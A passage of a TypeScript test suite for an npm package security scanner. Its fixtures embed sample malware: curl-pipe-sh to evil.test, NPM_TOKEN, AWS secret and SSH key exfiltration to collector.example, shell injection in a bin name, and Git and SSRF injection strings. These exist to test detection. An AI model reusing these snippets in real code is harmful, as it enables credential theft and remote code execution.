import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { describe, it } from "node:test";
import { gunzipSync, gzipSync } from "node:zlib";
import {
  validateGitRef,
  validateGitSubdir,
  validateRemoteGitUrl,
  verifyTarballVsGitParity,
  walkGitHistoryForCleanAnchor,
} from "../src/analysis/parity-and-bisect.ts";
import { escapeMarkdownCell, triageUnpackedEntries } from "../src/analysis/static-triage.ts";
import { SingleFlight, SplitPlaneCache } from "../src/cache/sqlite-store.ts";
import { appendAuditEvent, verifyAuditLog } from "../src/compliance/audit-log.ts";
import { DEFAULT_POLICY, loadNpmrc, loadPolicy, routeDiscoveryQuery, routeRegistry } from "../src/config/policy.ts";
import { auditDependencyConfusion, fetchWithSafeRedirects, validateOutboundUrl } from "../src/intel/registry-osv.ts";
import { computeSha512Integrity, unpackTarballInMemory, validateArchivePath } from "../src/quarantine/safe-unpack.ts";
import {
  assembleInspectionReport,
  buildReaEscalationPlan,
  checkLocalWorkspaceCompromised,
  formatCycloneDxSbom,
  formatInspectionMarkdownCard,
} from "../src/verdict/engine-and-formatters.ts";
import { buildSyntheticTgz } from "./helpers.ts";

const DUMMY_CAPS = {
  node_version: process.version,
  git_available: true,
  git_partial_clone_supported: true,
  rea_cli_available: false,
  sqlite_available: true,
};

function buildPaxTar(records: string, targetName: string, content: string, typeflag = "x"): Buffer {
  const blocks: Buffer[] = [];
  const makeHeader = (name: string, size: number, tf: string) => {
    const h = Buffer.alloc(512, 0);
    h.write(name, 0, Math.min(100, Buffer.byteLength(name)), "utf8");
    h.write("0000644\0", 100, 8, "ascii");
    h.write("0000000\0", 108, 8, "ascii");
    h.write("0000000\0", 116, 8, "ascii");
    h.write(`${size.toString(8).padStart(11, "0")}\0`, 124, 12, "ascii");
    h.write("00000000000\0", 136, 12, "ascii");
    h.write("        ", 148, 8, "ascii");
    h.write(tf, 156, 1, "ascii");
    h.write("ustar\0", 257, 6, "ascii");
    h.write("00", 263, 2, "ascii");
    let sum = 0;
    for (let i = 0; i < 512; i++) sum += h[i] ?? 0;
    h.write(`${sum.toString(8).padStart(6, "0")}\0 `, 148, 8, "ascii");
    return h;
  };
  const pushData = (buf: Buffer) => {
    blocks.push(buf);
    const rem = buf.length % 512;
    if (rem !== 0) blocks.push(Buffer.alloc(512 - rem, 0));
  };

  const paxBuf = Buffer.from(records, "utf8");
  blocks.push(makeHeader("PaxHeader", paxBuf.length, typeflag));
  pushData(paxBuf);

  const bodyBuf = Buffer.from(content, "utf8");
  blocks.push(makeHeader(targetName, bodyBuf.length, "0"));
  pushData(bodyBuf);

  blocks.push(Buffer.alloc(1024, 0));
  return gzipSync(Buffer.concat(blocks));
}

function paxLine(key: string, val: string): string {
  const rest = ` ${key}=${val}\n`;
  let len = Buffer.byteLength(rest) + 1;
  while (Buffer.byteLength(`${len}${rest}`) !== len) {
    len = Buffer.byteLength(`${len}${rest}`);
  }
  return `${len}${rest}`;
}

describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency & Packaging", () => {
  it("closes static-triage evasion vectors: template literals, Unicode escapes, multi-hop taint, DNS/exec sinks, spread, and 0x obfuscation", async () => {
    const hexPayload = Buffer.from("require('child_process').exec('curl https://evil.test | sh')").toString("hex");
    const tgz = buildSyntheticTgz([
      {
        name: "package/package.json",
        content: JSON.stringify({ name: "evasion-suite", version: "1.0.0", license: "MIT" }),
      },
      {
        name: "package/tpl.js",
        content: "const t = process.env.NPM_TOKEN; fetch(`https://collector.example/?k=${t}`);",
      },
      {
        name: "package/uni.js",
        content: 'globalThis["\\u0065\\u0076\\u0061\\u006c"]("1+1"); const c = String.fromCharCode(99,117,114,108,32,104,116,116,112,115,58,47);',
      },
      {
        name: "package/multihop.js",
        content:
          "import dns from 'node:dns'; const raw = process['env']['AWS_SECRET_ACCESS_KEY']; const enc = Buffer.from(raw).toString('hex'); const host = enc + '.x.example'; dns.lookup(host, () => {});",
      },
      {
        name: "package/spread-and-exec.js",
        content:
          "import { execSync } from 'node:child_process'; const copy = { ...process.env }; execSync('curl https://cdn.example/drop.sh | sh'); console.log(copy);",
      },
      {
        name: "package/hex.js",
        content: `const h = "${hexPayload}"; console.log(h.length);`,
      },
    ]);

    const unpack = await unpackTarballInMemory(tgz, DEFAULT_POLICY);
    const triage = triageUnpackedEntries(unpack.entries, DEFAULT_POLICY);
    const byFile = (file: string) => new Set(triage.observations.filter((o) => o.path === file).map((o) => o.code));

    assert.ok(byFile("tpl.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "template literal taint must be caught");
    assert.ok(byFile("uni.js").has("OBFUSCATED_DYNAMIC_EXEC"), "unicode-escaped eval & fromCharCode must be caught");
    assert.ok(byFile("multihop.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "multi-hop DNS taint must be caught");
    assert.ok(byFile("spread-and-exec.js").has("ENV_SERIALIZATION_EXFIL"), "object spread of process.env must be caught");
    assert.ok(byFile("spread-and-exec.js").has("CHILD_PROCESS_DANGEROUS_EXEC"), "direct child_process curl-pipe-sh must be caught");
    assert.ok(byFile("hex.js").has("BASE64_PAYLOAD_SUSPICIOUS"), "hex-encoded command payload must be caught");
  });

  it("handles regex literals with //, Map.get, path.resolve, and RegExp.exec without false positives", async () => {
    const tgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "clean-regex-cli", version: "1.0.0", license: "MIT" }) },
      {
        name: "package/index.js",
        content: `
          import path from "node:path";
          const re = /https?:\\/\\//i;
          const m = /foo/.exec("foobar");
          const cache = new Map();
          const v = cache.get("a") ?? path.resolve(".", "x");
          const mode = process.env.NODE_ENV;
          console.log(\`ok=\${re.test("https://example.org")} \${mode} \${m?.[0]} \${v}\`);
        `,
      },
    ]);
    const unpack = await unpackTarballInMemory(tgz, DEFAULT_POLICY);
    const triage = triageUnpackedEntries(unpack.entries, DEFAULT_POLICY);
    assert.equal(triage.observations.length, 0);
  });

  it("hardens tar unpacker against bad checksums, PAX linkpath smuggling, and Windows illegal chars", async () => {
    assert.equal(validateArchivePath("package/bad<name>.js").safe, false);
    assert.equal(validateArchivePath("package/bad|pipe.js").safe, false);
    assert.equal(validateArchivePath("package/bad?q.js").safe, false);

    // PAX linkpath smuggling must be rejected as CRITICAL
    const paxLinkTar = buildPaxTar(
      paxLine("path", "package/sneaky.js") + paxLine("linkpath", "/etc/passwd"),
      "package/placeholder",
      "ok",
      "x",
    );
    const linkRes = await unpackTarballInMemory(paxLinkTar, DEFAULT_POLICY);
    assert.ok(linkRes.observations.some((o) => o.code === "ARCHIVE_UNSAFE_LINK_OR_DEVICE" && o.severity === "CRITICAL"));

    // Valid PAX UTF-8 path must unpack cleanly
    const paxOkTar = buildPaxTar(paxLine("path", "package/café-cli.js"), "package/fallback", "export const x = 1;", "x");
    const okRes = await unpackTarballInMemory(paxOkTar, DEFAULT_POLICY);
    assert.equal(okRes.ok, true);
    assert.equal(okRes.entries[0]?.path, "café-cli.js");

    // Corrupted tar header checksum must fail closed
    const badTar = Buffer.alloc(1536, 0);
    badTar.write("package/index.js", 0, "utf8");
    badTar.write("0000123\0", 148, 8, "ascii");
    const chkRes = await unpackTarballInMemory(gzipSync(badTar), DEFAULT_POLICY);
    assert.equal(chkRes.ok, false);
    assert.ok(chkRes.observations.some((o) => o.code === "ARCHIVE_CORRUPT_HEADER_CHECKSUM"));
  });

  it("blocks Git argument injection, unsafe refs/subdirs, provenance-masked local drift, and tarball-only compromises", () => {
    assert.equal(validateRemoteGitUrl("https://github.com/org/repo.git").valid, true);
    assert.equal(validateRemoteGitUrl("--upload-pack=calc.exe").valid, false);
    assert.equal(validateRemoteGitUrl("ext::sh -c id").valid, false);
    assert.equal(validateRemoteGitUrl("file:///etc/passwd").valid, false);
    assert.equal(validateRemoteGitUrl("ssh://git@github.com/org/repo.git").valid, false);
    assert.equal(validateRemoteGitUrl("https://169.254.169.254/latest/meta-data/").valid, false);

    assert.equal(validateGitRef("HEAD"), true);
    assert.equal(validateGitRef("a".repeat(40)), true);
    assert.equal(validateGitRef("--output=/tmp/pwn"), false);
    assert.equal(validateGitSubdir("packages/cli"), true);
    assert.equal(validateGitSubdir("../escape"), false);
    assert.equal(validateGitSubdir("--option"), false);

    const repoDir = mkdtempSync(join(tmpdir(), "coldpin-git-hard-"));
    try {
      const git = (args: string[]) => execFileSync("git", args, { cwd: repoDir, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
      git(["init", "-b", "main"]);
      git(["config", "user.name", "T"]);
      git(["config", "user.email", "t@e.com"]);

      // Commit 1 (v1.0.0 clean release)
      writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "@org/app", version: "1.0.0", license: "MIT", bin: { mybin: "./cli.js" } }));
      writeFileSync(join(repoDir, "cli.js"), "console.log('v1');\n");
      git(["add", "."]);
      git(["commit", "-m", "v1.0.0"]);
      const c1 = git(["rev-parse", "HEAD"]);

      // Commit 2 (untagged clean docs tweak between releases)
      writeFileSync(join(repoDir, "README.md"), "# docs\n");
      git(["add", "."]);
      git(["commit", "-m", "docs"]);
      const c2 = git(["rev-parse", "HEAD"]);

      // Commit 3 (HEAD clean in Git, but v2.0.0 tarball published compromised!)
      writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "@org/app", version: "2.0.0", license: "MIT", bin: { mybin: "./cli.js" } }));
      git(["add", "."]);
      git(["commit", "-m", "v2.0.0"]);
      const c3 = git(["rev-parse", "HEAD"]);

      // Local Git drift MUST still trigger even when provenanceAttested=true
      const drift = verifyTarballVsGitParity({
        tarballManifest: { name: "@org/app", version: "2.0.0", scripts: { postinstall: "curl https://evil.test | sh" } },
        tarballEntries: [],
        provenanceAttested: true,
        gitHead: c3,
        localGitDir: repoDir,
      });
      assert.equal(drift.tier, "TARBALL_SOURCE_DRIFT");

      // Tarball-only compromise on v2.0.0 (c3) must skip untagged clean c2 and recover verified clean release v1.0.0 (c1)
      const relMap = new Map([
        [c1, { version: "1.0.0", tarball_sha512: "sha512-CLEAN1==", provenance_attested: true }],
        [c3, { version: "2.0.0", tarball_sha512: "sha512-BAD2==", provenance_attested: false }],
      ]);
      const decision = walkGitHistoryForCleanAnchor({
        package_name: "@org/app",
        repoUrlOrLocalPath: repoDir,
        isLocalDir: true,
        binName: "mybin",
        policy: DEFAULT_POLICY,
        releaseTarballByCommit: relMap,
        compromisedVersions: new Set(["2.0.0"]),
      });
      assert.equal(decision.recommended_action, "ROLLBACK_TO_SAFE_ANCHOR");
      assert.equal(decision.safe_anchor?.version, "1.0.0");
      assert.equal(decision.safe_anchor?.commit_sha, c1);
      assert.ok(decision.safe_anchor?.pinned_execution.command?.endsWith(" -- mybin"));
      assert.ok(c2.length === 40);
    } finally {
      rmSync(repoDir, { recursive: true, force: true });
    }
  });

  it("enforces SSRF metadata blocks, cross-origin redirect bearer-token stripping, and multi-token private-scope isolation", async () => {
    assert.equal(validateOutboundUrl("http://169.254.169.254/latest/meta-data/").ok, false);
    assert.equal(validateOutboundUrl("https://metadata.google.internal/computeMetadata/v1/").ok, false);
    assert.equal(validateOutboundUrl("file:///etc/shadow").ok, false);

    // Multi-word discovery query containing embedded private scope or prefix must NEVER route to public npm
    const dir = mkdtempSync(join(tmpdir(), "coldpin-pol-"));
    try {
      writeFileSync(
        join(dir, ".coldpin.policy.json"),
        JSON.stringify({
          private_scopes: ["@Acme"],
          private_prefixes: ["acme-internal-"],
          private_registries: { "@Acme": "https://artifactory.acme.internal/npm" },
        }),
      );
      const { policy, policy_path } = loadPolicy(dir);
      assert.ok(policy_path?.endsWith(".coldpin.policy.json"));
      const npmrc = loadNpmrc(dir);
      // Mixed-case @Acme registry key must normalize cleanly
      assert.equal(routeRegistry("@acme/cli", policy, npmrc).route, "private");
      assert.equal(routeDiscoveryQuery("find @acme/deploy-cli tool", undefined, policy, npmrc).route, "private");
      assert.equal(routeDiscoveryQuery("find @amce/deploy-cli tool", undefined, policy, npmrc).route, "blocked_typo");
      assert.equal(routeDiscoveryQuery("search acme-internal-billing", undefined, policy, npmrc).route, "blocked_unconfigured");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }

    // Real local two-server cross-origin redirect test proving Authorization bearer token is stripped on redirect
    let targetSawAuth: string | undefined = "UNSET";
    let originSawAuth: string | undefined = "UNSET";
    const targetSrv = createServer((req, res) => {
      targetSawAuth = req.headers["authorization"];
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
    });
    await new Promise<void>((r) => targetSrv.listen(0, "127.0.0.1", () => r()));
    const targetPort = (targetSrv.address() as AddressInfo).port;

    const originSrv = createServer((req, res) => {
      originSawAuth = req.headers["authorization"];
      res.writeHead(302, { location: `http://127.0.0.1:${targetPort}/tarball.tgz` });
      res.end();
    });
    await new Promise<void>((r) => originSrv.listen(0, "127.0.0.1", () => r()));
    const originPort = (originSrv.address() as AddressInfo).port;

    try {
      const originUrl = `http://127.0.0.1:${originPort}/pkg`;
      const targetOrigin = `http://127.0.0.1:${targetPort}`;
      const ctrl = new AbortController();
      // First hop matches origin; second hop jumps to different port (different origin) -> must reject non-HTTPS cross-origin OR strip auth
      const crossHttpBlocked = await fetchWithSafeRedirects({
        url: originUrl,
        headers: { "user-agent": "test" },
        authToken: "SUPER_SECRET_NPM_TOKEN",
        allowedAuthOrigin: `http://127.0.0.1:${originPort}`,
        allowPlainHttpOrigin: `http://127.0.0.1:${originPort}`,
        signal: ctrl.signal,
      });
      assert.equal(originSawAuth, "Bearer SUPER_SECRET_NPM_TOKEN");
      assert.equal(crossHttpBlocked.ok, false); // Plain HTTP cross-origin blocked!
      assert.equal(targetSawAuth, "UNSET");

      // Even when target origin IS explicitly allowed plain HTTP, bearer token MUST be stripped because allowedAuthOrigin != targetOrigin
      const resStrip = await fetchWithSafeRedirects({
        url: `${targetOrigin}/tarball.tgz`,
        headers: { "user-agent": "test" },
        authToken: "SUPER_SECRET_NPM_TOKEN",
        allowedAuthOrigin: `http://127.0.0.1:${originPort}`,
        allowPlainHttpOrigin: targetOrigin,
        signal: ctrl.signal,
      });
      assert.equal(resStrip.ok, true);
      assert.equal(targetSawAuth, undefined, "Authorization header MUST be stripped on cross-origin request");
    } finally {
      targetSrv.close();
      originSrv.close();
    }
  });

  it("supports SingleFlight dedup, SplitPlaneCache inspect hit, concurrent locked audit appends, multi-lockfile detection, CycloneDX VEX, and REA plans", async () => {
    // 1. SingleFlight deduplicates concurrent producers
    const sf = new SingleFlight<number>();
    let runs = 0;
    const vals = await Promise.all(
      Array.from({ length: 8 }, () =>
        sf.run("same-key", async () => {
          runs++;
          await new Promise((r) => setTimeout(r, 15));
          return 42;
        }),
      ),
    );
    assert.equal(runs, 1);
    assert.deepEqual(vals, Array(8).fill(42));

    // 2. Concurrent multi-process audit log appends maintain a 100% valid hash chain via atomic lockfile
    const workDir = mkdtempSync(join(tmpdir(), "coldpin-conc-"));
    try {
      const auditPath = join(workDir, "audit.jsonl");
      const cacheDir = join(workDir, "cache");
      const tgzPath = join(workDir, "clean.tgz");
      writeFileSync(
        tgzPath,
        buildSyntheticTgz([
          { name: "package/package.json", content: JSON.stringify({ name: "cache-test", version: "1.0.0", license: "MIT" }) },
          { name: "package/index.js", content: "console.log('hi');\n" },
        ]),
      );

      // Run 2 sequential CLI inspects against same cache dir with --verbose to confirm cache_hit=false -> cache_hit=true
      const cliPath = resolve("src/cli.ts");
      const runCliVerbose = () =>
        new Promise<{ code: number; stderr: string }>((res) => {
          const p = spawn(process.execPath, [
            "--no-warnings",
            cliPath,
            "inspect",
            "--tarball",
            tgzPath,
            "--offline",
            "--cache-dir",
            cacheDir,
            "--audit-log",
            auditPath,
            "--override-ticket",
            "SEC-1234",
            "--verbose",
            "--json",
          ]);
          let stderr = "";
          p.stderr.on("data", (d) => (stderr += String(d)));
          p.on("close", (code) => res({ code: code ?? 1, stderr }));
        });

      const r1 = await runCliVerbose();
      const r2 = await runCliVerbose();
      assert.equal(r1.code, 2); // offline -> UNVERIFIABLE_UNKNOWN
      assert.equal(r2.code, 2);
      assert.ok(r1.stderr.includes('"cache_hit":false'));
      assert.ok(r2.stderr.includes('"cache_hit":true'));

      // Fire 6 concurrent CLI processes appending to the SAME audit.jsonl simultaneously
      await Promise.all(Array.from({ length: 6 }, () => runCliVerbose()));
      const verified = verifyAuditLog(auditPath);
      assert.equal(verified.valid, true, `Concurrent audit chain corrupted: ${verified.reason}`);
      assert.equal(verified.total_events, 8);

      // 3. Multi-lockfile compromise detection: pnpm-lock.yaml and yarn.lock
      const pnpmDir = join(workDir, "pnpm-proj");
      mkdirSync(pnpmDir, { recursive: true });
      writeFileSync(pnpmDir + "/pnpm-lock.yaml", "lockfileVersion: '9.0'\npackages:\n  bad-pkg@2.3.4:\n    resolution: {}\n");
      const pnpmHit = checkLocalWorkspaceCompromised(pnpmDir, "bad-pkg", "MALICIOUS_INDICATORS_FOUND");
      assert.equal(pnpmHit?.lockfile_kind, "pnpm-lock.yaml");
      assert.equal(pnpmHit?.matched_version, "2.3.4");

      const yarnDir = join(workDir, "yarn-proj");
      mkdirSync(yarnDir, { recursive: true });
      writeFileSync(yarnDir + "/yarn.lock", '"@org/bad@^1.0.0":\n  version "1.4.2"\n  resolved "https://registry.yarnpkg.com/x"\n');
      const yarnHit = checkLocalWorkspaceCompromised(yarnDir, "@org/bad", "MALICIOUS_INDICATORS_FOUND");
      assert.equal(yarnHit?.lockfile_kind, "yarn.lock");
      assert.equal(yarnHit?.matched_version, "1.4.2");

      // 4. CycloneDX 1.5 SBOM + VEX & REA Escalation Plan + Markdown cell escaping
      const wasmTgz = buildSyntheticTgz([
        { name: "package/package.json", content: JSON.stringify({ name: "wasm-tool", version: "1.0.0", license: "MIT", dependencies: { chalk: "5.3.0" } }) },
        { name: "package/mod.wasm", content: Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]) },
      ]);
      const unpack = await unpackTarballInMemory(wasmTgz, DEFAULT_POLICY);
      const triage = triageUnpackedEntries(unpack.entries, DEFAULT_POLICY);
      const report = assembleInspectionReport({
        package_name: "wasm-tool",
        version: "1.0.0",
        org_or_scope: "unscoped",
        creator: "dev|pipe`tick",
        category_tags: [],
        summary: "Tool | with | pipes",
        license: "MIT",
        bin_names: [],
        unpack,
        triage,
        parity: { tier: "PROVENANCE_ATTESTED", provenance_attested: true, observations: [], unknowns: [] },
        advisories: [
          {
            id: "GHSA-xxxx-yyyy-zzzz",
            is_malicious: false,
            severity: "HIGH",
            kev: true,
            summary: "Known exploited issue",
            package_name: "wasm-tool",
            affected_version: "1.0.0",
          },
        ],
        registryObservations: [],
        registryUnknowns: [],
        policy: DEFAULT_POLICY,
        host_capabilities: DUMMY_CAPS,
        cwd: workDir,
      });

      const plan = buildReaEscalationPlan({ triage, parity: { tier: "PROVENANCE_ATTESTED", provenance_attested: true, observations: [], unknowns: [] }, host_capabilities: DUMMY_CAPS });
      assert.ok(plan?.steps.some((s) => s.recommended_tool === "inspect_wasm_artifact"));
      assert.ok(report.rea_escalation_plan);

      const card = formatInspectionMarkdownCard(report);
      assert.ok(card.includes("### REA Tier-2 Escalation Plan"));
      assert.equal(escapeMarkdownCell("a|b`c"), "a\\|b'c");

      const sbom = formatCycloneDxSbom(report, triage.manifest?.dependencies) as {
        serialNumber?: string;
        vulnerabilities?: Array<{ id: string; analysis: { state: string } }>;
        dependencies?: Array<{ dependsOn: string[] }>;
      };
      assert.ok(sbom.serialNumber?.startsWith("urn:uuid:"));
      assert.equal(sbom.vulnerabilities?.[0]?.id, "GHSA-xxxx-yyyy-zzzz");
      assert.equal(sbom.vulnerabilities?.[0]?.analysis.state, "exploitable");
      assert.equal(sbom.dependencies?.[0]?.dependsOn.length, 1);

      // SplitPlaneCache stats & pruning
      const memCache = new SplitPlaneCache(":memory:");
      memCache.putThreatIntel({ intel_key: "k1", source: "osv", payload: [], ttl_seconds: 1, now_ms: 1000 });
      assert.equal(memCache.getStats().threat_intel_count, 1);
      assert.equal(memCache.pruneExpiredIntel(5000), 1);
      assert.equal(memCache.getStats().threat_intel_count, 0);
      memCache.close();
    } finally {
      rmSync(workDir, { recursive: true, force: true });
    }
  });

  it("enforces EGM reproducible packaging, manifest/link validation, --no-overwrite refusal, and workspace mirror byte parity", () => {
    const outDir = mkdtempSync(join(tmpdir(), "coldpin-pack-"));
    try {
      // 1. Fresh build across all targets succeeds & verifies byte-for-byte reproducibility + internal links
      const out1 = execFileSync(
        "python",
        ["scripts/pack_plugin.py", "--target", "all", "--out-dir", outDir, "--verify", "--no-overwrite"],
        { encoding: "utf8" },
      );
      assert.ok(out1.includes("PACK REPRODUCIBLE OK [antigravity]"));
      assert.ok(out1.includes("PACK REPRODUCIBLE OK [claude]"));
      assert.ok(out1.includes("PACK REPRODUCIBLE OK [openai]"));
      assert.ok(existsSync(join(outDir, "coldpin-antigravity.zip")));

      // 2. Second build to same outDir with --no-overwrite MUST fail closed (EGM overwrite refusal)
      let failed = false;
      try {
        execFileSync(
          "python",
          ["scripts/pack_plugin.py", "--target", "antigravity", "--out-dir", outDir, "--no-overwrite"],
          { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] },
        );
      } catch {
        failed = true;
      }
      assert.equal(failed, true, "pack_plugin.py --no-overwrite must refuse overwriting existing archives");

      // 3. Verify workspace mirror .agents/skills/coldpin matches skill-src/coldpin byte-for-byte
      const srcRoot = resolve("skill-src/coldpin");
      const mirrorRoot = resolve(".agents/skills/coldpin");
      const listFiles = (dir: string, prefix = ""): string[] => {
        const res: string[] = [];
        for (const name of readdirSync(dir, { withFileTypes: true })) {
          const rel = prefix ? `${prefix}/${name.name}` : name.name;
          if (name.isDirectory()) res.push(...listFiles(join(dir, name.name), rel));
          else if (name.isFile()) res.push(rel);
        }
        return res.sort();
      };
      const srcFiles = listFiles(srcRoot);
      const mirrorFiles = listFiles(mirrorRoot);
      assert.deepEqual(mirrorFiles, srcFiles);
      for (const rel of srcFiles) {
        assert.deepEqual(readFileSync(join(mirrorRoot, rel)), readFileSync(join(srcRoot, rel)), `Mirror drift in ${rel}`);
      }
    } finally {
      rmSync(outDir, { recursive: true, force: true });
    }
  });

  it("blocks shell injection via package.json bin, closes cross-file/wrapper/Reflect/path.join/identifier evasions, tar EOF/PAX/K smuggling, IPv6-mapped SSRF, KEV-on-HEAD, non-monotonic bisect, Yarn Berry, nested npm lock, and audit extra-field tampering", async () => {
    // 1. Manifest bin key shell injection MUST fail as MALICIOUS_INDICATORS_FOUND and emit command: null
    const binInjTgz = buildSyntheticTgz([
      {
        name: "package/package.json",
        content: JSON.stringify({
          name: "innocent-tool",
          version: "1.0.0",
          license: "MIT",
          bin: { "cli; curl https://evil.test | sh #": "./index.js" },
        }),
      },
      { name: "package/index.js", content: "console.log('ok');" },
    ]);
    const binUnpack = await unpackTarballInMemory(binInjTgz, DEFAULT_POLICY);
    const binTriage = triageUnpackedEntries(binUnpack.entries, DEFAULT_POLICY);
    const binReport = assembleInspectionReport({
      package_name: "innocent-tool",
      version: "1.0.0",
      org_or_scope: "unscoped",
      creator: "a",
      category_tags: [],
      summary: "ok",
      license: "MIT",
      bin_names: Object.keys((binTriage.manifest?.bin as Record<string, string>) ?? {}),
      unpack: binUnpack,
      triage: binTriage,
      parity: { tier: "PROVENANCE_ATTESTED", provenance_attested: true, observations: [], unknowns: [] },
      advisories: [],
      registryObservations: [],
      registryUnknowns: [],
      policy: DEFAULT_POLICY,
      host_capabilities: DUMMY_CAPS,
      cwd: tmpdir(),
    });
    assert.equal(binReport.verdict, "MALICIOUS_INDICATORS_FOUND");
    assert.equal(binReport.pinned_execution.command, null);
    assert.ok(binTriage.observations.some((o) => o.code === "MANIFEST_SHELL_INJECTION_META"));

    // 2. Cross-file split-payload taint + wrapper sink + path.join('.ssh','id_rsa') + {env}=process + Reflect.get + var-stored execSync + constructor.constructor + ev\u0061l
    const advTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "adv-evade", version: "1.0.0", license: "MIT" }) },
      { name: "package/a.js", content: "export const secret = process.env.NPM_TOKEN;" },
      { name: "package/b.js", content: 'import { secret } from "./a.js"; fetch("https://collector.example/hit", { method: "POST", body: secret });' },
      { name: "package/f1.js", content: 'const send = (x) => fetch("https://collector.example/x", { method: "POST", body: x }); send(process.env.NPM_TOKEN);' },
      { name: "package/f2.js", content: 'import fs from "node:fs"; import path from "node:path"; import os from "node:os"; const k = fs.readFileSync(path.join(os.homedir(), ".ssh", "id_rsa"), "utf8"); fetch("https://collector.example/k", { body: k });' },
      { name: "package/f3.js", content: 'const { env } = process; fetch("https://collector.example/e", { body: JSON.stringify(env) });' },
      { name: "package/f4.js", content: 'import { execSync } from "node:child_process"; const cmd = "curl https://evil.test/s | sh"; execSync(cmd);' },
      { name: "package/f5.js", content: '[].constructor.constructor("return process.exit(0)")();' },
      { name: "package/f6.js", content: 'const e = Reflect.get(process, "env"); fetch("https://collector.example/r", { body: JSON.stringify(e) });' },
      { name: "package/f7.js", content: 'ev\\u0061l("1+1");' },
    ]);
    const advUnpack = await unpackTarballInMemory(advTgz, DEFAULT_POLICY);
    const advTriage = triageUnpackedEntries(advUnpack.entries, DEFAULT_POLICY);
    const codesFor = (f: string) => new Set(advTriage.observations.filter((o) => o.path === f).map((o) => o.code));
    assert.ok(codesFor("b.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "cross-file split-payload taint must be caught");
    assert.ok(codesFor("f1.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "wrapper sink function taint must be caught");
    assert.ok(codesFor("f2.js").has("CREDENTIAL_FILE_ACCESS") && codesFor("f2.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "path.join .ssh/id_rsa must be caught");
    assert.ok(codesFor("f3.js").has("ENV_SERIALIZATION_EXFIL"), "{ env } = process serialization must be caught");
    assert.ok(codesFor("f4.js").has("CHILD_PROCESS_DANGEROUS_EXEC"), "var-stored execSync command must be caught");
    assert.ok(codesFor("f5.js").has("OBFUSCATED_DYNAMIC_EXEC"), "constructor.constructor must be caught");
    assert.ok(codesFor("f6.js").has("ENV_SERIALIZATION_EXFIL"), "Reflect.get(process, 'env') must be caught");
    assert.ok(codesFor("f7.js").has("OBFUSCATED_DYNAMIC_EXEC"), "Unicode-escaped identifier ev\\u0061l must be caught");

    // 3. Tar EOF single-zero-block smuggling, malformed PAX, GNU 'K' LongLink, and hidden Unicode path
    const cleanRaw = gunzipSync(buildSyntheticTgz([{ name: "package/package.json", content: "{}" }]));
    const evilRaw = gunzipSync(buildSyntheticTgz([{ name: "package/evil.js", content: "eval('1');" }]));
    const eofRes = await unpackTarballInMemory(gzipSync(Buffer.concat([cleanRaw.subarray(0, cleanRaw.length - 512), evilRaw])), DEFAULT_POLICY);
    assert.equal(eofRes.ok, false);
    assert.ok(eofRes.observations.some((o) => o.code === "ARCHIVE_EOF_POLYGLOT_SMUGGLING"));

    const badPaxRes = await unpackTarballInMemory(buildPaxTar("not-a-valid-pax-record", "package/a.js", "ok", "x"), DEFAULT_POLICY);
    assert.equal(badPaxRes.ok, false);
    assert.ok(badPaxRes.observations.some((o) => o.code === "ARCHIVE_MALFORMED_PAX_HEADER"));

    const gnuKRes = await unpackTarballInMemory(buildSyntheticTgz([{ name: "package/longlink", content: "/etc/passwd", typeflag: "K" }]), DEFAULT_POLICY);
    assert.ok(gnuKRes.observations.some((o) => o.code === "ARCHIVE_UNSAFE_LINK_OR_DEVICE"));
    assert.equal(validateArchivePath("package/ind\u202eex.js").safe, false);

    // 4. IPv4-mapped IPv6 SSRF guards
    assert.equal(validateOutboundUrl("https://[::ffff:169.254.169.254]/latest/meta-data/").ok, false);
    assert.equal(validateOutboundUrl("https://[::ffff:127.0.0.1]/admin").ok, false);
    assert.equal(validateRemoteGitUrl("https://[::ffff:127.0.0.1]/org/repo.git").valid, false);
    assert.equal(validateRemoteGitUrl("https://[::ffff:169.254.169.254]/org/repo.git").valid, false);

    // 5. Fail-closed on skipped oversized file & OSV API unavailable
    const tinyPolicy = { ...DEFAULT_POLICY, max_single_file_bytes: 64 };
    const bigTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "big-pkg", version: "1.0.0", license: "MIT" }) },
      { name: "package/bundle.js", content: "a".repeat(256) },
    ]);
    const bigUnpack = await unpackTarballInMemory(bigTgz, tinyPolicy);
    const bigTriage = triageUnpackedEntries(bigUnpack.entries, tinyPolicy);
    const bigReport = assembleInspectionReport({
      package_name: "big-pkg",
      version: "1.0.0",
      org_or_scope: "unscoped",
      creator: "dev",
      category_tags: [],
      summary: "ok",
      license: "MIT",
      bin_names: [],
      unpack: bigUnpack,
      triage: bigTriage,
      parity: { tier: "PROVENANCE_ATTESTED", provenance_attested: true, observations: [], unknowns: [] },
      advisories: [],
      registryObservations: [],
      registryUnknowns: ["OSV_API_UNAVAILABLE: HTTP 503"],
      policy: tinyPolicy,
      host_capabilities: DUMMY_CAPS,
      cwd: tmpdir(),
    });
    assert.equal(bigReport.verdict, "UNVERIFIABLE_UNKNOWN");

    // 6. KEV on HEAD + non-monotonic history detection + cross-file split payload in Git repo
    const tmpDir = mkdtempSync(join(tmpdir(), "coldpin-reg-"));
    try {
      const git = (a: string[]) => execFileSync("git", a, { cwd: tmpDir, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
      git(["init", "-b", "main"]);
      git(["config", "user.name", "T"]);
      git(["config", "user.email", "t@e.com"]);

